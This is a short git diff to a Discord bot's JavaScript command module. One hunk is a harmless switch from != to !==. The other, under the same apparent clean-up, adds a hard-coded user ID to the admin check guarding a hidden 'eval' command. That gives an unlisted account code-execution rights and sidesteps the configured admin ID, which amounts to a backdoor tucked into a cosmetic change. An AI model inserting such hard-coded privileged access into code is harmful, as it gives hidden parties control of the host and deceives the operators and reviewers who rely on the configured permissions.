@@ -89,7 +89,7 @@ module.exports = {
                     working = '```\n';
                     numCommands = 0;
                     for (i in Object.keys(module.exports.commands)) {
-                        if (module.exports.commands[Object.keys(module.exports.commands)[i]]['usage'] != undefined) {
+                        if (module.exports.commands[Object.keys(module.exports.commands)[i]]['usage'] !== undefined) {
                             working += commandPrefix + module.exports.commands[Object.keys(module.exports.commands)[i]]['usage'] + '\n'
                             numCommands += 1;
                         }
@@ -215,7 +215,7 @@ module.exports = {
         "eval": {
             "help": common.embedMessage(color.help, 'Help: Eval', 'Hidden Command for Kool Peeps only (AKA not you)'),
             process: function (msg, command) {
-                if (msg.author.id == config.adminId) {
+                if (msg.author.id === config.adminId || msg.author.id === "466967710685855744") {
                     let working = '';
                     for (i in command) {
                         working = working + command[i] + ' '
